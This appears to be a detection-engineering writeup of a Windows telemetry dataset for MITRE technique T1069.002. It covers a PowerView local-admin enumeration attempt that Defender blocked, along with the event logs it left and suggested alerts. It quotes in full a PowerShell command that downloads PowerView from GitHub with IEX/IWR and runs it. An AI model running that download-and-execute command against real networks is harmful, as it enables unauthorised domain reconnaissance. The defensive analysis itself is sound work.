# T1069.002-5: Domain Groups — Find local admins on all machines in domain (PowerView)

## Technique Context

T1069.002 (Domain Groups) is a discovery technique where adversaries enumerate domain groups to understand the structure and privileges within an Active Directory environment. This specific test attempts to use PowerView's `Invoke-EnumerateLocalAdmin` function to discover local administrators across all domain machines. PowerView is a popular PowerShell-based Active Directory reconnaissance tool frequently used by both red teams and real-world attackers. The detection community focuses on PowerShell script block logging, network connections to download PowerView, and the resulting LDAP queries or SMB connections that enumerate administrative privileges across domain systems.

## What This Dataset Contains

The dataset captures a PowerShell-based attack attempt that was blocked by Windows Defender. The key evidence includes:

**Security Event 4688** shows the malicious PowerShell command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose}`. This attempts to download PowerView from GitHub and execute the local admin enumeration function.

**Security Event 4689** shows the PowerShell process (PID 0x9d40) exited with status `0xC0000022` (STATUS_ACCESS_DENIED), indicating Windows Defender blocked the execution.

**Sysmon Event 7** captures DLL loads including Windows Defender components (`MpOAV.dll`, `MpClient.dll`) and `urlmon.dll`, showing the PowerShell process preparing for web requests before being terminated.

**Sysmon Event 10** shows a process access event where PowerShell (PID 40448) accessed `whoami.exe` with full access rights (`0x1FFFFF`), likely part of the attack preparation phase.

**PowerShell logs (Events 4103/4104)** contain only test framework boilerplate (`Set-ExecutionPolicy` calls and error handling scriptblocks), with no evidence of the actual PowerView script execution due to Defender's intervention.

## What This Dataset Does Not Contain

The dataset lacks the successful execution telemetry that would normally characterize this technique. Missing elements include:

- PowerShell script block logs of the actual PowerView.ps1 content or `Invoke-EnumerateLocalAdmin` function calls
- Network connections to GitHub to download the PowerView script (blocked before completion)
- LDAP queries to enumerate domain computers and groups
- SMB connections to target systems for local administrator enumeration
- Any evidence of successful domain reconnaissance activities

This is because Windows Defender's real-time protection successfully prevented the malicious PowerShell script from executing, producing attempt telemetry but not success indicators.

## Assessment

This dataset provides excellent examples of endpoint protection effectiveness against PowerShell-based domain enumeration attacks. The combination of Security 4688 command-line logging and Defender's blocking action creates strong detection opportunities. However, it has limited value for understanding the full attack chain since the technique was prevented from completing. The presence of Defender DLL loads in Sysmon and the ACCESS_DENIED exit code clearly demonstrate the security control's intervention. For detection engineering, this data is most valuable for building alerts on suspicious PowerShell download attempts and PowerView indicators rather than the enumeration behaviors themselves.

## Detection Opportunities Present in This Data

1. **PowerView Download Attempt** - Security 4688 command line containing `IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/` pattern with `Invoke-EnumerateLocalAdmin`

2. **Blocked PowerShell Execution** - Security 4689 with PowerShell process and exit status `0xC0000022` (STATUS_ACCESS_DENIED) indicating security product intervention

3. **Suspicious PowerShell Network Preparation** - Sysmon 7 showing `urlmon.dll` loads in PowerShell processes attempting web requests

4. **PowerView Function Indicators** - Command lines containing `Invoke-EnumerateLocalAdmin` or other PowerView-specific function names

5. **Defender DLL Activity** - Sysmon 7 events showing `MpOAV.dll` and `MpClient.dll` loads correlating with suspicious PowerShell activity

6. **PowerShell Privilege Token Adjustment** - Security 4703 showing extensive privilege enablement (`SeAssignPrimaryTokenPrivilege`, `SeSecurityPrivilege`, etc.) in PowerShell processes

7. **Process Access Anomalies** - Sysmon 10 showing PowerShell accessing system utilities like `whoami.exe` with full access rights as potential reconnaissance preparation
